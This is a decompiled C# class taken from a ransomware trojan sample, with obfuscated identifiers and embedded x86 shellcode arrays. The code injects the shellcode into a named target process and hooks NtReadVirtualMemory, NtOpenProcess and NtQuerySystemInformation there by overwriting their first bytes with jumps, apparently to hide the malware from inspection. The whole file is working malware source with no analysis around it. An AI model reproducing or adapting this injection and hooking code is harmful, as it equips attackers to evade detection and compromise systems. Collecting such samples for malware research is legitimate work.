// Decompiled with JetBrains decompiler
// Type: lowFQsJSlrFgr.qMyHPNTWke
// Assembly: Final-02.exe, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C3A0FEE4-03D5-43E6-BB9B-FAFC16FEF04E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.Win32.Generic-6a5090762c6058bc223e37e89f53832faad80995e3c5ed7e59ed9f5a5e604e47.exe

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace lowFQsJSlrFgr
{
  internal sealed class qMyHPNTWke
  {
    private static byte[] DZxtIitbpJsIPE = new byte[240]
    {
      (byte) 85,
      (byte) 139,
      (byte) 236,
      (byte) 131,
      (byte) 236,
      (byte) 20,
      (byte) 86,
      (byte) 199,
      (byte) 69,
      (byte) 248,
      (byte) 1,
      (byte) 0,
      (byte) 0,
      (byte) 192,
      (byte) 232,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 88,
      (byte) 37,
      (byte) 0,
      (byte) 240,
      byte.MaxValue,
      byte.MaxValue,
      (byte) 137,
      (byte) 69,
      (byte) 252,
      byte.MaxValue,
      (byte) 117,
      (byte) 24,
      byte.MaxValue,
      (byte) 117,
      (byte) 20,
      byte.MaxValue,
      (byte) 117,
      (byte) 16,
      byte.MaxValue,
      (byte) 117,
      (byte) 12,
      byte.MaxValue,
      (byte) 117,
      (byte) 8,
      (byte) 139,
      (byte) 69,
      (byte) 252,
      (byte) 131,
      (byte) 192,
      (byte) 24,
      byte.MaxValue,
      (byte) 208,
      (byte) 137,
      (byte) 69,
      (byte) 248,
      (byte) 131,
      (byte) 125,
      (byte) 248,
      (byte) 0,
      (byte) 15,
      (byte) 140,
      (byte) 168,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      byte.MaxValue,
      (byte) 117,
      (byte) 8,
      (byte) 139,
      (byte) 69,
      (byte) 252,
      byte.MaxValue,
      (byte) 16,
      (byte) 139,
      (byte) 240,
      (byte) 139,
      (byte) 69,
      (byte) 252,
      byte.MaxValue,
      (byte) 80,
      (byte) 4,
      (byte) 59,
      (byte) 240,
      (byte) 116,
      (byte) 10,
      (byte) 131,
      (byte) 125,
      (byte) 8,
      byte.MaxValue,
      (byte) 15,
      (byte) 133,
      (byte) 138,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 131,
      (byte) 101,
      (byte) 244,
      (byte) 0,
      (byte) 235,
      (byte) 7,
      (byte) 139,
      (byte) 69,
      (byte) 244,
      (byte) 64,
      (byte) 137,
      (byte) 69,
      (byte) 244,
      (byte) 131,
      (byte) 125,
      (byte) 244,
      (byte) 3,
      (byte) 115,
      (byte) 119,
      (byte) 139,
      (byte) 69,
      (byte) 244,
      (byte) 139,
      (byte) 77,
      (byte) 252,
      (byte) 131,
      (byte) 124,
      (byte) 129,
      (byte) 12,
      (byte) 0,
      (byte) 116,
      (byte) 101,
      (byte) 139,
      (byte) 69,
      (byte) 244,
      (byte) 139,
      (byte) 77,
      (byte) 252,
      (byte) 139,
      (byte) 68,
      (byte) 129,
      (byte) 12,
      (byte) 59,
      (byte) 69,
      (byte) 12,
      (byte) 114,
      (byte) 86,
      (byte) 139,
      (byte) 69,
      (byte) 12,
      (byte) 3,
      (byte) 69,
      (byte) 20,
      (byte) 139,
      (byte) 77,
      (byte) 244,
      (byte) 139,
      (byte) 85,
      (byte) 252,
      (byte) 57,
      (byte) 68,
      (byte) 138,
      (byte) 12,
      (byte) 115,
      (byte) 68,
      (byte) 139,
      (byte) 69,
      (byte) 244,
      (byte) 139,
      (byte) 77,
      (byte) 252,
      (byte) 139,
      (byte) 68,
      (byte) 129,
      (byte) 12,
      (byte) 43,
      (byte) 69,
      (byte) 12,
      (byte) 137,
      (byte) 69,
      (byte) 240,
      (byte) 131,
      (byte) 101,
      (byte) 236,
      (byte) 0,
      (byte) 235,
      (byte) 7,
      (byte) 139,
      (byte) 69,
      (byte) 236,
      (byte) 64,
      (byte) 137,
      (byte) 69,
      (byte) 236,
      (byte) 131,
      (byte) 125,
      (byte) 236,
      (byte) 24,
      (byte) 115,
      (byte) 33,
      (byte) 139,
      (byte) 69,
      (byte) 244,
      (byte) 107,
      (byte) 192,
      (byte) 24,
      (byte) 139,
      (byte) 77,
      (byte) 252,
      (byte) 141,
      (byte) 68,
      (byte) 1,
      (byte) 24,
      (byte) 139,
      (byte) 77,
      (byte) 236,
      (byte) 3,
      (byte) 77,
      (byte) 240,
      (byte) 139,
      (byte) 85,
      (byte) 16,
      (byte) 139,
      (byte) 117,
      (byte) 236,
      (byte) 138,
      (byte) 4,
      (byte) 48,
      (byte) 136,
      (byte) 4,
      (byte) 10,
      (byte) 235,
      (byte) 210,
      (byte) 233,
      (byte) 124,
      byte.MaxValue,
      byte.MaxValue,
      byte.MaxValue,
      (byte) 139,
      (byte) 69,
      (byte) 248,
      (byte) 94,
      (byte) 201,
      (byte) 194,
      (byte) 20,
      (byte) 0
    };
    private static byte[] WKhTEbOwSmjen = new byte[84]
    {
      (byte) 85,
      (byte) 139,
      (byte) 236,
      (byte) 81,
      (byte) 81,
      (byte) 199,
      (byte) 69,
      (byte) 248,
      (byte) 1,
      (byte) 0,
      (byte) 0,
      (byte) 192,
      (byte) 232,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 88,
      (byte) 37,
      (byte) 0,
      (byte) 240,
      byte.MaxValue,
      byte.MaxValue,
      (byte) 137,
      (byte) 69,
      (byte) 252,
      (byte) 131,
      (byte) 125,
      (byte) 20,
      (byte) 0,
      (byte) 116,
      (byte) 22,
      (byte) 139,
      (byte) 69,
      (byte) 20,
      (byte) 139,
      (byte) 77,
      (byte) 252,
      (byte) 139,
      (byte) 0,
      (byte) 59,
      (byte) 65,
      (byte) 8,
      (byte) 117,
      (byte) 9,
      (byte) 199,
      (byte) 69,
      (byte) 248,
      (byte) 34,
      (byte) 0,
      (byte) 0,
      (byte) 192,
      (byte) 235,
      (byte) 23,
      byte.MaxValue,
      (byte) 117,
      (byte) 20,
      byte.MaxValue,
      (byte) 117,
      (byte) 16,
      byte.MaxValue,
      (byte) 117,
      (byte) 12,
      byte.MaxValue,
      (byte) 117,
      (byte) 8,
      (byte) 139,
      (byte) 69,
      (byte) 252,
      (byte) 131,
      (byte) 192,
      (byte) 48,
      byte.MaxValue,
      (byte) 208,
      (byte) 137,
      (byte) 69,
      (byte) 248,
      (byte) 139,
      (byte) 69,
      (byte) 248,
      (byte) 201,
      (byte) 194,
      (byte) 16,
      (byte) 0
    };
    private static byte[] tbKNmFyDWybjv = new byte[405]
    {
      (byte) 85,
      (byte) 139,
      (byte) 236,
      (byte) 131,
      (byte) 236,
      (byte) 28,
      (byte) 86,
      (byte) 87,
      (byte) 199,
      (byte) 69,
      (byte) 236,
      (byte) 1,
      (byte) 0,
      (byte) 0,
      (byte) 192,
      (byte) 232,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 88,
      (byte) 37,
      (byte) 0,
      (byte) 240,
      byte.MaxValue,
      byte.MaxValue,
      (byte) 137,
      (byte) 69,
      (byte) 240,
      byte.MaxValue,
      (byte) 117,
      (byte) 20,
      byte.MaxValue,
      (byte) 117,
      (byte) 16,
      byte.MaxValue,
      (byte) 117,
      (byte) 12,
      byte.MaxValue,
      (byte) 117,
      (byte) 8,
      (byte) 139,
      (byte) 69,
      (byte) 240,
      (byte) 131,
      (byte) 192,
      (byte) 72,
      byte.MaxValue,
      (byte) 208,
      (byte) 137,
      (byte) 69,
      (byte) 236,
      (byte) 131,
      (byte) 125,
      (byte) 236,
      (byte) 0,
      (byte) 15,
      (byte) 140,
      (byte) 78,
      (byte) 1,
      (byte) 0,
      (byte) 0,
      (byte) 131,
      (byte) 125,
      (byte) 8,
      (byte) 5,
      (byte) 117,
      (byte) 93,
      (byte) 131,
      (byte) 101,
      (byte) 248,
      (byte) 0,
      (byte) 139,
      (byte) 69,
      (byte) 12,
      (byte) 137,
      (byte) 69,
      (byte) 244,
      (byte) 139,
      (byte) 69,
      (byte) 244,
      (byte) 131,
      (byte) 56,
      (byte) 0,
      (byte) 116,
      (byte) 70,
      (byte) 139,
      (byte) 69,
      (byte) 244,
      (byte) 137,
      (byte) 69,
      (byte) 248,
      (byte) 139,
      (byte) 69,
      (byte) 248,
      (byte) 139,
      (byte) 77,
      (byte) 248,
      (byte) 3,
      (byte) 8,
      (byte) 137,
      (byte) 77,
      (byte) 244,
      (byte) 139,
      (byte) 69,
      (byte) 244,
      (byte) 139,
      (byte) 77,
      (byte) 240,
      (byte) 139,
      (byte) 64,
      (byte) 68,
      (byte) 59,
      (byte) 65,
      (byte) 8,
      (byte) 117,
      (byte) 37,
      (byte) 139,
      (byte) 69,
      (byte) 244,
      (byte) 131,
      (byte) 56,
      (byte) 0,
      (byte) 117,
      (byte) 8,
      (byte) 139,
      (byte) 69,
      (byte) 248,
      (byte) 131,
      (byte) 32,
      (byte) 0,
      (byte) 235,
      (byte) 15,
      (byte) 139,
      (byte) 69,
      (byte) 248,
      (byte) 139,
      (byte) 0,
      (byte) 139,
      (byte) 77,
      (byte) 244,
      (byte) 3,
      (byte) 1,
      (byte) 139,
      (byte) 77,
      (byte) 248,
      (byte) 137,
      (byte) 1,
      (byte) 139,
      (byte) 69,
      (byte) 248,
      (byte) 137,
      (byte) 69,
      (byte) 244,
      (byte) 235,
      (byte) 178,
      (byte) 233,
      (byte) 235,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 131,
      (byte) 125,
      (byte) 8,
      (byte) 16,
      (byte) 15,
      (byte) 133,
      (byte) 225,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 139,
      (byte) 69,
      (byte) 12,
      (byte) 137,
      (byte) 69,
      (byte) 252,
      (byte) 131,
      (byte) 101,
      (byte) 232,
      (byte) 0,
      (byte) 235,
      (byte) 7,
      (byte) 139,
      (byte) 69,
      (byte) 232,
      (byte) 64,
      (byte) 137,
      (byte) 69,
      (byte) 232,
      (byte) 139,
      (byte) 69,
      (byte) 252,
      (byte) 139,
      (byte) 77,
      (byte) 232,
      (byte) 59,
      (byte) 8,
      (byte) 15,
      (byte) 131,
      (byte) 192,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 139,
      (byte) 69,
      (byte) 232,
      (byte) 193,
      (byte) 224,
      (byte) 4,
      (byte) 139,
      (byte) 77,
      (byte) 252,
      (byte) 139,
      (byte) 85,
      (byte) 240,
      (byte) 139,
      (byte) 68,
      (byte) 1,
      (byte) 4,
      (byte) 59,
      (byte) 66,
      (byte) 8,
      (byte) 15,
      (byte) 133,
      (byte) 162,
      (byte) 0,
      (byte) 0,
      (byte) 0,
      (byte) 139,
      (byte) 69,
      (byte) 232,
      (byte) 193,
      (byte) 224,
      (byte) 4,
      (byte) 139,
      (byte) 77,
      (byte) 252,
      (byte) 198,
      (byte) 68,
      (byte) 1,
      (byte) 9,
      (byte) 0,
      (byte) 139,
      (byte) 69,
      (byte) 232,
      (byte) 193,
      (byte) 224,
      (byte) 4,
      (byte) 139,
      (byte) 77,
      (byte) 252,
      (byte) 131,
      (byte) 100,
      (byte) 1,
      (byte) 16,
      (byte) 0,
      (byte) 139,
      (byte) 69,
      (byte) 232,
      (byte) 193,
      (byte) 224,
      (byte) 4,
      (byte) 51,
      (byte) 201,
      (byte) 139,
      (byte) 85,
      (byte) 252,
      (byte) 102,
      (byte) 137,
      (byte) 76,
      (byte) 2,
      (byte) 10,
      (byte) 139,
      (byte) 69,
      (byte) 232,
      (byte) 193,
      (byte) 224,
      (byte) 4,
      (byte) 139,
      (byte) 77,
      (byte) 252,
      (byte) 131,
      (byte) 100,
      (byte) 1,
      (byte) 12,
      (byte) 0,
      (byte) 139,
      (byte) 69,
      (byte) 232,
      (byte) 193,
      (byte) 224,
      (byte) 4,
      (byte) 139,
      (byte) 77,
      (byte) 252,
      (byte) 198,
      (byte) 68,
      (byte) 1,
      (byte) 8,
      (byte) 0,
      (byte) 139,
      (byte) 69,
      (byte) 232,
      (byte) 193,
      (byte) 224,
      (byte) 4,
      (byte) 139,
      (byte) 77,
      (byte) 252,
      (byte) 131,
      (byte) 100,
      (byte) 1,
      (byte) 4,
      (byte) 0,
      (byte) 139,
      (byte) 69,
      (byte) 232,
      (byte) 137,
      (byte) 69,
      (byte) 228,
      (byte) 235,
      (byte) 7,
      (byte) 139,
      (byte) 69,
      (byte) 228,
      (byte) 64,
      (byte) 137,
      (byte) 69,
      (byte) 228,
      (byte) 139,
      (byte) 69,
      (byte) 252,
      (byte) 139,
      (byte) 77,
      (byte) 228,
      (byte) 59,
      (byte) 8,
      (byte) 115,
      (byte) 33,
      (byte) 139,
      (byte) 69,
      (byte) 228,
      (byte) 64,
      (byte) 193,
      (byte) 224,
      (byte) 4,
      (byte) 139,
      (byte) 77,
      (byte) 252,
      (byte) 141,
      (byte) 116,
      (byte) 1,
      (byte) 4,
      (byte) 139,
      (byte) 69,
      (byte) 228,
      (byte) 193,
      (byte) 224,
      (byte) 4,
      (byte) 139,
      (byte) 77,
      (byte) 252,
      (byte) 141,
      (byte) 124,
      (byte) 1,
      (byte) 4,
      (byte) 165,
      (byte) 165,
      (byte) 165,
      (byte) 165,
      (byte) 235,
      (byte) 206,
      (byte) 139,
      (byte) 69,
      (byte) 252,
      (byte) 139,
      (byte) 0,
      (byte) 72,
      (byte) 139,
      (byte) 77,
      (byte) 252,
      (byte) 137,
      (byte) 1,
      (byte) 139,
      (byte) 69,
      (byte) 232,
      (byte) 72,
      (byte) 137,
      (byte) 69,
      (byte) 232,
      (byte) 233,
      (byte) 43,
      byte.MaxValue,
      byte.MaxValue,
      byte.MaxValue,
      (byte) 139,
      (byte) 69,
      (byte) 236,
      (byte) 95,
      (byte) 94,
      (byte) 201,
      (byte) 194,
      (byte) 16,
      (byte) 0
    };

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool CloseHandle(IntPtr intptr_0);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr OpenProcess(int int_0, bool bool_0, uint uint_0);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool ReadProcessMemory(
      IntPtr cqfndObvnDEeza,
      IntPtr jBacZZFJtjKoa,
      [Out] byte[] UtYgjauGymkL,
      uint ZePFJgitRBK,
      ref uint eeAfUdgXhvsJT);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool WriteProcessMemory(
      IntPtr intptr_0,
      IntPtr intptr_1,
      byte[] byte_0,
      uint uint_0,
      ref uint uint_1);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool VirtualProtectEx(
      IntPtr intptr_0,
      IntPtr intptr_1,
      uint uint_0,
      uint uint_1,
      ref uint uint_2);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool Module32Next(
      IntPtr intptr_0,
      ref qMyHPNTWke.kKiURvoHFZukizJ kKiURvoHFZukizJ_0);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool Module32First(
      IntPtr intptr_0,
      ref qMyHPNTWke.kKiURvoHFZukizJ kKiURvoHFZukizJ_0);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr CreateToolhelp32Snapshot(uint uint_0, uint uint_1);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr VirtualAllocEx(
      IntPtr intptr_0,
      IntPtr intptr_1,
      uint uint_0,
      uint uint_1,
      uint uint_2);

    private static byte[] ZdomFWCkgYpQtg(IntPtr intptr_0, IntPtr intptr_1, uint uint_0)
    {
      byte[] numArray = new byte[checked ((int) ((ulong) uint_0 - 1UL) + 1)];
      byte[] UtYgjauGymkL = numArray;
      uint eeAfUdgXhvsJT = 0;
      qMyHPNTWke.ReadProcessMemory(intptr_0, intptr_1, UtYgjauGymkL, uint_0, ref eeAfUdgXhvsJT);
      return numArray;
    }

    private static uint lXdpDSlyROWslu(IntPtr intptr_0, uint uint_0, string string_0)
    {
      uint uint32_1 = BitConverter.ToUInt32(qMyHPNTWke.ZdomFWCkgYpQtg(intptr_0, (IntPtr) checked ((long) ((ulong) uint_0 + 60UL)), 4U), 0);
      uint uint32_2 = BitConverter.ToUInt32(qMyHPNTWke.ZdomFWCkgYpQtg(intptr_0, (IntPtr) checked ((long) ((ulong) (uint_0 + uint32_1) + 120UL)), 4U), 0);
      byte[] numArray = qMyHPNTWke.ZdomFWCkgYpQtg(intptr_0, (IntPtr) (long) checked (uint_0 + uint32_2), 40U);
      int int32 = BitConverter.ToInt32(numArray, 24);
      uint num1 = checked (BitConverter.ToUInt32(numArray, 32) + uint_0);
      uint num2 = checked (BitConverter.ToUInt32(numArray, 28) + uint_0);
      uint num3 = checked (BitConverter.ToUInt32(numArray, 36) + uint_0);
      IntPtr num4 = Marshal.AllocHGlobal(64);
      int num5 = int32;
      int num6 = 1;
      uint num7;
      while (num6 <= num5)
      {
        uint uint32_3 = BitConverter.ToUInt32(qMyHPNTWke.ZdomFWCkgYpQtg(intptr_0, (IntPtr) checked ((long) ((ulong) num1 + (ulong) ((num6 - 1) * 4))), 4U), 0);
        Marshal.Copy(qMyHPNTWke.ZdomFWCkgYpQtg(intptr_0, (IntPtr) (long) checked (uint_0 + uint32_3), 64U), 0, num4, 64);
        string stringAnsi = Marshal.PtrToStringAnsi(num4);
        uint int16 = checked ((uint) BitConverter.ToInt16(qMyHPNTWke.ZdomFWCkgYpQtg(intptr_0, (IntPtr) (long) ((ulong) num3 + (ulong) ((num6 - 1) * 2)), 2U), 0));
        uint num8 = checked (BitConverter.ToUInt32(qMyHPNTWke.ZdomFWCkgYpQtg(intptr_0, (IntPtr) (long) ((ulong) num2 + (ulong) int16 * 4UL), 4U), 0) + uint_0);
        if (string.Compare(stringAnsi, string_0, true) != 0)
        {
          checked { ++num6; }
        }
        else
        {
          Marshal.FreeHGlobal(num4);
          num7 = num8;
          goto label_6;
        }
      }
      Marshal.FreeHGlobal(num4);
      num7 = 0U;
label_6:
      return num7;
    }

    private static IntPtr dLZDqvevdgBbx(string string_0, string string_1)
    {
      IntPtr toolhelp32Snapshot = qMyHPNTWke.CreateToolhelp32Snapshot(24U, checked ((uint) Process.GetProcessesByName(string_0)[0].Id));
      IntPtr zero = IntPtr.Zero;
      IntPtr num1;
      IntPtr num2;
      if (toolhelp32Snapshot == zero)
      {
        num1 = zero;
      }
      else
      {
        qMyHPNTWke.kKiURvoHFZukizJ kKiURvoHFZukizJ_0 = new qMyHPNTWke.kKiURvoHFZukizJ();
        kKiURvoHFZukizJ_0.ONWwedZZuSlfT = checked ((uint) Marshal.SizeOf<qMyHPNTWke.kKiURvoHFZukizJ>(kKiURvoHFZukizJ_0));
        if (qMyHPNTWke.Module32First(toolhelp32Snapshot, ref kKiURvoHFZukizJ_0))
        {
          while (kKiURvoHFZukizJ_0.cuaUPxUKGKphwT.ToInt64() > (long) int.MaxValue || string.Compare(string_1, kKiURvoHFZukizJ_0.PagqcqSGcV, true) != 0)
          {
            if (!qMyHPNTWke.Module32Next(toolhelp32Snapshot, ref kKiURvoHFZukizJ_0))
              goto label_6;
          }
          num2 = kKiURvoHFZukizJ_0.cuaUPxUKGKphwT;
          goto label_8;
        }
label_6:
        num1 = zero;
      }
      num2 = num1;
label_8:
      return num2;
    }

    private static int iQCcsOlISTnQhr(int int_0, int int_1) => checked (int_0 - int_1 - 5);

    public static void CusTKXtiVMDCm(string string_0)
    {
      byte[] numArray1 = new byte[97];
      uint[] numArray2 = new uint[4];
      byte[][] numArray3 = new byte[4][];
      uint uint_2 = 0;
      byte[] numArray4 = new byte[5]
      {
        (byte) 233,
        (byte) 0,
        (byte) 0,
        (byte) 0,
        (byte) 0
      };
      byte[][] numArray5 = new byte[3][]
      {
        qMyHPNTWke.DZxtIitbpJsIPE,
        qMyHPNTWke.WKhTEbOwSmjen,
        qMyHPNTWke.tbKNmFyDWybjv
      };
      uint num1 = checked ((uint) (numArray5[0].Length + numArray5[1].Length + numArray5[2].Length));
      IntPtr intptr_0_1 = qMyHPNTWke.OpenProcess(56, false, checked ((uint) Process.GetProcessesByName(string_0)[0].Id));
      IntPtr zero = IntPtr.Zero;
      uint num2 = checked ((uint) (int) qMyHPNTWke.VirtualAllocEx(intptr_0_1, zero, (uint) ((ulong) num1 + 96UL), 12288U, 64U));
      uint num3 = checked ((uint) (int) qMyHPNTWke.lXdpDSlyROWslu(intptr_0_1, (uint) (int) qMyHPNTWke.dLZDqvevdgBbx(string_0, "kernel32.dll"), "GetProcessId"));
      uint num4 = checked ((uint) (int) qMyHPNTWke.lXdpDSlyROWslu(intptr_0_1, (uint) (int) qMyHPNTWke.dLZDqvevdgBbx(string_0, "kernel32.dll"), "GetCurrentProcessId"));
      numArray2[0] = checked ((uint) (int) qMyHPNTWke.lXdpDSlyROWslu(intptr_0_1, (uint) (int) qMyHPNTWke.dLZDqvevdgBbx(string_0, "ntdll.dll"), "NtReadVirtualMemory"));
      numArray2[1] = checked ((uint) (int) qMyHPNTWke.lXdpDSlyROWslu(intptr_0_1, (uint) (int) qMyHPNTWke.dLZDqvevdgBbx(string_0, "ntdll.dll"), "NtOpenProcess"));
      numArray2[2] = checked ((uint) (int) qMyHPNTWke.lXdpDSlyROWslu(intptr_0_1, (uint) (int) qMyHPNTWke.dLZDqvevdgBbx(string_0, "ntdll.dll"), "NtQuerySystemInformation"));
      numArray3[0] = qMyHPNTWke.ZdomFWCkgYpQtg(intptr_0_1, (IntPtr) (long) numArray2[0], 24U);
      numArray3[1] = qMyHPNTWke.ZdomFWCkgYpQtg(intptr_0_1, (IntPtr) (long) numArray2[1], 24U);
      numArray3[2] = qMyHPNTWke.ZdomFWCkgYpQtg(intptr_0_1, (IntPtr) (long) numArray2[2], 24U);
      BitConverter.GetBytes(num3).CopyTo((Array) numArray1, 0);
      BitConverter.GetBytes(num4).CopyTo((Array) numArray1, 4);
      BitConverter.GetBytes(Process.GetCurrentProcess().Id).CopyTo((Array) numArray1, 8);
      BitConverter.GetBytes(numArray2[0]).CopyTo((Array) numArray1, 12);
      BitConverter.GetBytes(numArray2[1]).CopyTo((Array) numArray1, 16);
      BitConverter.GetBytes(numArray2[2]).CopyTo((Array) numArray1, 20);
      numArray3[0].CopyTo((Array) numArray1, 24);
      numArray3[1].CopyTo((Array) numArray1, 48);
      numArray3[2].CopyTo((Array) numArray1, 72);
      uint num5 = num2;
      IntPtr intptr_0_2 = intptr_0_1;
      IntPtr intptr_1_1 = (IntPtr) (long) num5;
      byte[] byte_0_1 = numArray1;
      uint uint_1_1 = 0;
      qMyHPNTWke.WriteProcessMemory(intptr_0_2, intptr_1_1, byte_0_1, 96U, ref uint_1_1);
      uint num6 = checked ((uint) ((ulong) num5 + 96UL));
      int num7 = checked (numArray5.Length - 1);
      int index = 0;
      while (index <= num7)
      {
        IntPtr intptr_0_3 = intptr_0_1;
        IntPtr intptr_1_2 = (IntPtr) (long) num6;
        byte[] byte_0_2 = numArray5[index];
        uint length = checked ((uint) numArray5[index].Length);
        uint uint_1_2 = 0;
        qMyHPNTWke.WriteProcessMemory(intptr_0_3, intptr_1_2, byte_0_2, length, ref uint_1_2);
        num6 = checked ((uint) ((ulong) num6 + (ulong) numArray5[index].Length));
        checked { ++index; }
      }
      IntPtr intptr_0_4 = intptr_0_1;
      IntPtr intptr_1_3 = (IntPtr) (long) num2;
      uint uint_0 = checked ((uint) ((ulong) num1 + 96UL));
      uint num8 = 0;
      qMyHPNTWke.VirtualProtectEx(intptr_0_4, intptr_1_3, uint_0, 16U, ref num8);
      uint int_0_1 = checked ((uint) ((ulong) num2 + 96UL));
      BitConverter.GetBytes(qMyHPNTWke.iQCcsOlISTnQhr(checked ((int) int_0_1), checked ((int) numArray2[0]))).CopyTo((Array) numArray4, 1);
      qMyHPNTWke.VirtualProtectEx(intptr_0_1, (IntPtr) (long) numArray2[0], checked ((uint) numArray4.Length), 64U, ref uint_2);
      IntPtr intptr_0_5 = intptr_0_1;
      IntPtr intptr_1_4 = (IntPtr) (long) numArray2[0];
      byte[] byte_0_3 = numArray4;
      uint length1 = checked ((uint) numArray4.Length);
      num8 = 0U;
      qMyHPNTWke.WriteProcessMemory(intptr_0_5, intptr_1_4, byte_0_3, length1, ref num8);
      IntPtr intptr_0_6 = intptr_0_1;
      IntPtr intptr_1_5 = (IntPtr) (long) numArray2[0];
      uint length2 = checked ((uint) numArray4.Length);
      uint uint_1_3 = uint_2;
      num8 = 0U;
      qMyHPNTWke.VirtualProtectEx(intptr_0_6, intptr_1_5, length2, uint_1_3, ref num8);
      uint int_0_2 = checked ((uint) ((ulong) int_0_1 + (ulong) numArray5[0].Length));
      BitConverter.GetBytes(qMyHPNTWke.iQCcsOlISTnQhr(checked ((int) int_0_2), checked ((int) numArray2[1]))).CopyTo((Array) numArray4, 1);
      qMyHPNTWke.VirtualProtectEx(intptr_0_1, (IntPtr) (long) numArray2[1], checked ((uint) numArray4.Length), 64U, ref uint_2);
      IntPtr intptr_0_7 = intptr_0_1;
      IntPtr intptr_1_6 = (IntPtr) (long) numArray2[1];
      byte[] byte_0_4 = numArray4;
      uint length3 = checked ((uint) numArray4.Length);
      num8 = 0U;
      qMyHPNTWke.WriteProcessMemory(intptr_0_7, intptr_1_6, byte_0_4, length3, ref num8);
      IntPtr intptr_0_8 = intptr_0_1;
      IntPtr intptr_1_7 = (IntPtr) (long) numArray2[1];
      uint length4 = checked ((uint) numArray4.Length);
      uint uint_1_4 = uint_2;
      num8 = 0U;
      qMyHPNTWke.VirtualProtectEx(intptr_0_8, intptr_1_7, length4, uint_1_4, ref num8);
      BitConverter.GetBytes(qMyHPNTWke.iQCcsOlISTnQhr(checked ((int) (uint) ((ulong) int_0_2 + (ulong) numArray5[1].Length)), checked ((int) numArray2[2]))).CopyTo((Array) numArray4, 1);
      qMyHPNTWke.VirtualProtectEx(intptr_0_1, (IntPtr) (long) numArray2[2], checked ((uint) numArray4.Length), 64U, ref uint_2);
      IntPtr intptr_0_9 = intptr_0_1;
      IntPtr intptr_1_8 = (IntPtr) (long) numArray2[2];
      byte[] byte_0_5 = numArray4;
      uint length5 = checked ((uint) numArray4.Length);
      num8 = 0U;
      qMyHPNTWke.WriteProcessMemory(intptr_0_9, intptr_1_8, byte_0_5, length5, ref num8);
      IntPtr intptr_0_10 = intptr_0_1;
      IntPtr intptr_1_9 = (IntPtr) (long) numArray2[2];
      uint length6 = checked ((uint) numArray4.Length);
      uint uint_1_5 = uint_2;
      num8 = 0U;
      qMyHPNTWke.VirtualProtectEx(intptr_0_10, intptr_1_9, length6, uint_1_5, ref num8);
      qMyHPNTWke.CloseHandle(intptr_0_1);
    }

    public struct kKiURvoHFZukizJ
    {
      public uint ONWwedZZuSlfT;
      public uint ZJrcbcSzWFZe;
      public uint SLxhlqYKxeDhXdoh;
      public uint QtsrtVnuFo;
      public uint dxpsMZRJClYYIH;
      public IntPtr cuaUPxUKGKphwT;
      public uint dLTsoKeiuRjEJR;
      public IntPtr xPAhFQjWtYKL;
      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
      public string PagqcqSGcV;
      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
      public string MwSBnQitIpxLL;
    }
  }
}
